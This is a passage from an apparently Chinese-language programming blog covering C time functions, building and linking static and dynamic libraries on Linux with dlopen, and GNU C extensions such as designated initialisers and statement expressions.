<h3 id="mktime"><a href="#mktime" class="headerlink" title="mktime()"></a><code>mktime()</code></h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">time_t</span> <span class="title function_">mktime</span><span class="params">(<span class="keyword">struct</span> tm *tm)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>功能：将<code>tm</code>结构体转换为<code>time_t</code>格式。</li>
<li>参数：指向<code>tm</code>结构体的指针。</li>
<li>返回值：表示时间的<code>time_t</code>值。</li>
</ul>
<h3 id="strftime"><a href="#strftime" class="headerlink" title="strftime()"></a><code>strftime()</code></h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">strftime</span><span class="params">(<span class="type">char</span> *s, <span class="type">size_t</span> max, <span class="type">const</span> <span class="type">char</span> *format, <span class="type">const</span> <span class="keyword">struct</span> tm *tm)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>功能：格式化时间，将<code>tm</code>结构体格式化为字符串。</li>
<li>参数：<ul>
<li><code>s</code>：存储格式化结果的缓冲区。</li>
<li><code>max</code>：缓冲区的最大长度。</li>
<li><code>format</code>：格式控制字符串。</li>
<li><code>tm</code>：指向<code>tm</code>结构体。</li>
</ul>
</li>
<li>返回值：成功则返回写入缓冲区的字符数，失败则返回0。</li>
</ul>
<p>常用格式：</p>
<ul>
<li><code>%Y</code>：年份（如2023）</li>
<li><code>%m</code>：月份（01到12）</li>
<li><code>%d</code>：月份中的天数（01到31）</li>
<li><code>%H</code>：小时（00到23）</li>
<li><code>%M</code>：分钟（00到59）</li>
<li><code>%S</code>：秒（00到60）</li>
</ul>
<h3 id="difftime"><a href="#difftime" class="headerlink" title="difftime()"></a><code>difftime()</code></h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="title function_">difftime</span><span class="params">(<span class="type">time_t</span> time1, <span class="type">time_t</span> time0)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>功能：计算两个时间点之间的差，以秒为单位。</li>
<li>参数：两个<code>time_t</code>时间值。</li>
<li>返回值：时间差，单位为秒。</li>
</ul>
<h3 id="clock-gettime"><a href="#clock-gettime" class="headerlink" title="clock_gettime()"></a><code>clock_gettime()</code></h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">clock_gettime</span><span class="params">(<span class="type">clockid_t</span> clk_id, <span class="keyword">struct</span> timespec *tp)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>功能：获取指定时钟的时间。</li>
<li>参数：<ul>
<li><code>clk_id</code>：时钟标识，如<code>CLOCK_REALTIME</code>（系统实时时钟）、<code>CLOCK_MONOTONIC</code>（不受系统时间改变影响的时钟）。</li>
<li><code>tp</code>：指向<code>timespec</code>结构体的指针，用于存储获取的时间值。</li>
</ul>
</li>
<li>返回值：成功返回0，失败返回-1。</li>
</ul>
<h3 id="strptime"><a href="#strptime" class="headerlink" title="strptime()"></a><code>strptime()</code></h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strptime</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s, <span class="type">const</span> <span class="type">char</span> *format, <span class="keyword">struct</span> tm *tm)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>功能：解析字符串时间，根据指定格式填充<code>tm</code>结构体。</li>
<li>参数：<ul>
<li><code>s</code>：输入时间字符串。</li>
<li><code>format</code>：格式控制字符串，定义如何解析<code>tim</code>字符串。</li>
<li><code>tm</code>：指向<code>tm</code>结构体，用于存储解析结果。</li>
</ul>
</li>
<li>返回值：指向处理完的字符串部分的指针。</li>
</ul>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>以下代码示范了如何使用上述函数来获取和处理时间：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 使用 clock_gettime</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">ts</span>;</span></span><br><span class="line">    clock_gettime(CLOCK_REALTIME, &amp;ts);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Seconds: %ld, Nanoseconds: %ld\n&quot;</span>, ts.tv_sec, ts.tv_nsec);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 time 和 localtime</span></span><br><span class="line">    <span class="type">time_t</span> now = time(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">local</span> =</span> localtime(&amp;now);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Local time: %s&quot;</span>, ctime(&amp;now));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 strftime</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">80</span>];</span><br><span class="line">    strftime(buffer, <span class="keyword">sizeof</span>(buffer), <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, local);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Formatted local time: %s\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 strptime</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> <span class="title">parsed_time</span>;</span></span><br><span class="line">    <span class="type">char</span> *result = strptime(<span class="string">&quot;2024-12-01 12:34:56&quot;</span>, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, &amp;parsed_time);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Parsed day of the month: %d\n&quot;</span>, parsed_time.tm_mday);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to parse time\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="动态库与静态库"><a href="#动态库与静态库" class="headerlink" title="动态库与静态库"></a>动态库与静态库</h1><p>对于二进制安全研究者对于动静态库的编译链接，动态链接流程应该很熟悉，起码知道<code>plt</code>表和<code>got</code>表的关系，<code>got</code>表何时保存真实地址。</p>
<p>在 Linux 中，库分为两种主要类型：静态库和动态库。这两种库都用于封装可重用的代码和资源，但它们的使用和制作方式有所不同。下面是详细的介绍。</p>
<h2 id="静态库（Static-Library）"><a href="#静态库（Static-Library）" class="headerlink" title="静态库（Static Library）"></a>静态库（Static Library）</h2><p>静态库是将多个目标文件（.o 文件）打包成一个单一文件（通常以 <code>.a</code> 结尾），在链接时直接与可执行文件合并。使用时只需要包含<code>.h</code>文件并在链接时指定<code>.a</code>即可。</p>
<h3 id="静态库的特点"><a href="#静态库的特点" class="headerlink" title="静态库的特点"></a>静态库的特点</h3><ul>
<li><strong>打包</strong>：在编译时将所有需要的代码编译并打包到一个静态库文件。</li>
<li><strong>代码包含</strong>：最终生成的可执行文件中包含了使用的库的所有代码，因此不会受到库文件是否存在的影响。</li>
<li><strong>版本管理</strong>：每当库代码更改时，需要重新编译使用该库的所有可执行文件。</li>
</ul>
<h3 id="制作静态库的步骤"><a href="#制作静态库的步骤" class="headerlink" title="制作静态库的步骤"></a>制作静态库的步骤</h3><ol>
<li><p><strong>编写源代码</strong>（假设有多个文件，如 <code>foo.c</code> 和 <code>bar.c</code>）：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from foo!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bar.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from bar!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>编译源代码为目标文件（.o 文件）</strong>：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c foo.c  <span class="comment"># 生成 foo.o</span></span><br><span class="line">gcc -c bar.c  <span class="comment"># 生成 bar.o</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>使用 <code>ar</code> 命令创建静态库</strong>：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ar rcs libmylibrary.a foo.o bar.o</span><br></pre></td></tr></table></figure></div>
<p>这里：</p>
<ul>
<li><code>r</code> 表示插入文件。</li>
<li><code>c</code> 表示创建静态库。</li>
<li><code>s</code> 表示创建索引。</li>
</ul>
</li>
<li><p><strong>使用静态库进行链接</strong>：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o myprogram main.c -L. -lmylibrary</span><br></pre></td></tr></table></figure></div>
<p>其中，<code>-L.</code> 指定库路径为当前目录，<code>-lmylibrary</code> 指定库名称（去掉前缀 <code>lib</code> 和后缀 <code>.a</code>）。</p>
</li>
</ol>
<h2 id="动态库（Dynamic-Library）"><a href="#动态库（Dynamic-Library）" class="headerlink" title="动态库（Dynamic Library）"></a>动态库（Dynamic Library）</h2><p>动态库在运行时链接，也称为共享库，通常以 <code>.so</code> 结尾。与静态库不同，动态库在程序运行时被加载。</p>
<h3 id="动态库的特点"><a href="#动态库的特点" class="headerlink" title="动态库的特点"></a>动态库的特点</h3><ul>
<li><strong>共享</strong>：多个程序可以共享同一个库，降低内存使用。</li>
<li><strong>更新方便</strong>：更新库文件后，所有依赖该库的程序可以立即受益，而无需重新编译它们。</li>
<li><strong>动态链接</strong>：在程序启动时或运行时动态加载库，代码不会嵌入到可执行文件中。</li>
</ul>
<h3 id="制作动态库的步骤"><a href="#制作动态库的步骤" class="headerlink" title="制作动态库的步骤"></a>制作动态库的步骤</h3><ol>
<li><p><strong>编写源代码</strong>（同样的例子）：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from foo!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bar.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from bar!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>编译源文件为位置无关的代码（-fPIC 标志）</strong>：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -c foo.c  <span class="comment"># 生成 foo.o</span></span><br><span class="line">gcc -fPIC -c bar.c  <span class="comment"># 生成 bar.o</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>使用 <code>gcc</code> 创建动态库</strong>：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o libmylibrary.so foo.o bar.o</span><br></pre></td></tr></table></figure></div>
<p>这里：</p>
<ul>
<li><code>-shared</code> 标志告诉编译器生成共享库。</li>
</ul>
</li>
<li><p><strong>使用动态库进行链接</strong>：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o myprogram main.c -L. -lmylibrary</span><br></pre></td></tr></table></figure></div>
<p>模式同静态库一样。</p>
</li>
<li><p><strong>设置环境变量</strong>（可选）：</p>
<ul>
<li>如果动态库不在标准路径下，可以设置环境变量 <code>LD_LIBRARY_PATH</code> 来告诉链接器查找库的位置。</li>
</ul>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=<span class="variable">$LD_LIBRARY_PATH</span>:.</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>使用dlopen</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __ADD_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __ADD_H__</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// __ADD_H__</span></span></span><br><span class="line"><span class="comment">// add.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;add.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">void</span> *handle;</span><br><span class="line">    <span class="type">int</span> (*add)(<span class="type">int</span>, <span class="type">int</span>);</span><br><span class="line">&#125; <span class="type">g_dyn_add_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">load_dyn_libadd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">g_dyn_add_t</span>.handle = dlopen(<span class="string">&quot;./libadd.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="type">g_dyn_add_t</span>.handle) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error: %s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">g_dyn_add_t</span>.add = dlsym(<span class="type">g_dyn_add_t</span>.handle, <span class="string">&quot;add&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="type">g_dyn_add_t</span>.add)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error: %s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>, c;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; load_dyn_libadd())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error: failed to load dynamic library\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    c = <span class="type">g_dyn_add_t</span>.add(a, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sum of %d and %d is %d\n&quot;</span>, a, b, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<hr>
<table>
<thead>
<tr>
<th>特性</th>
<th>静态库</th>
<th>动态库</th>
</tr>
</thead>
<tbody><tr>
<td>连接时机</td>
<td>编译时</td>
<td>运行时</td>
</tr>
<tr>
<td>文件扩展</td>
<td><code>.a</code></td>
<td><code>.so</code></td>
</tr>
<tr>
<td>内存使用</td>
<td>每个程序都有一份</td>
<td>多个程序共享一份</td>
</tr>
<tr>
<td>更新库的方式</td>
<td>需要重编所有程序</td>
<td>只需更新库文件</td>
</tr>
<tr>
<td>库的使用</td>
<td>更复杂的管理</td>
<td>更新简单，方便使用</td>
</tr>
</tbody></table>
<p>静态库和动态库各自有优缺点，开发者可以根据项目需求选择合适的方式。常见的做法是将相对稳定的基础库做成动态库，而不常更改的功能模块则可以选择静态库以便提升性能。</p>
<h1 id="GNU-C-扩展语法"><a href="#GNU-C-扩展语法" class="headerlink" title="GNU C 扩展语法"></a>GNU C 扩展语法</h1><h2 id="指定初始化"><a href="#指定初始化" class="headerlink" title="指定初始化"></a>指定初始化</h2><hr>
<p><strong>数组初始化</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">100</span>] = &#123;[<span class="number">10</span>] = <span class="number">1</span>, [<span class="number">30</span>] = <span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这样<code>arr[10]</code>和<code>arr[30]</code>便被初始化为<code>1</code>，数组内其他元素则是<code>0</code>。通过数组元素索引，我们可以直接给指定的数组元素赋值。除了数组，一个结构体变量的初始化，也可以通过指定某个结构体成员直接赋值。在早期C语言标准不支持指定初始化时，GCC编译器就已经支持指定初始化了，因此这个特性也被看作GCC编译器的一个扩展特性。</p>
<hr>
<p><strong>范围初始化</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">100</span>] = &#123;[<span class="number">10</span> ... <span class="number">30</span>] = <span class="number">1</span>, [<span class="number">50</span> ... <span class="number">60</span>] = <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> score</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span> ... <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span> ... <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>GNU C支持使用<code>...</code>表示范围扩展，这个特性不仅可以使用在数组初始化中，也可以使用在<code>switch-case</code>语句中。</p>
<hr>
<p><strong>结构体初始化</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hello_dev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mem[MAX_SIZE];</span><br><span class="line">&#125; * hello_devp;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_open</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_releace</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">hello_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">hello_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">hello_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">loff_t</span> <span class="title function_">hello_llseek</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">loff_t</span> offset, <span class="type">int</span> op)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">hello_fops</span> =</span> &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .llseek = hello_llseek,</span><br><span class="line">        .read = hello_read,</span><br><span class="line">        .write = hello_write,</span><br><span class="line">        .unlocked_ioctl = hello_ioctl,</span><br><span class="line">        .open = hello_open,</span><br><span class="line">        .release = hello_releace,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>在Linux内核驱动中，大量使用GNU C的这种指定初始化方式，通过结构体成员来初始化结构体变量。如在字符驱动程序中，我们经常见到这样的初始化。在驱动程序中，我们经常使用<code>file_operations</code>这个结构体来注册我们开发的驱动，然后系统会以回调的方式来执行驱动实现的具体功能。</p>
<h2 id="语句表达式"><a href="#语句表达式" class="headerlink" title="语句表达式"></a>语句表达式</h2><hr>
<p>GNU C对C语言标准作了扩展，允许在一个表达式里内嵌语句，允许在表达式内部使用局部变量、for循环和<code>goto</code>跳转语句。这种类型的表达式，我们称为语句表达式。语句表达式的格式如下。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#123;a; b; c;&#125;)</span><br></pre></td></tr></table></figure></div>

<p>语句表达式最外面使用小括号()括起来，里面一对大括号{}包起来的是代码块，代码块里允许内嵌各种语句。语句的格式可以是一般表达式，也可以是循环、跳转语句。和一般表达式一样，语句表达式也有自己的值。语句表达式的值为内嵌语句中最后一个表达式的值。我们举个例子，使用语句表达式求值。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sum = (&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i);</span><br><span class="line">    i;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>

<p>最后  <code>sum = 10;</code></p>
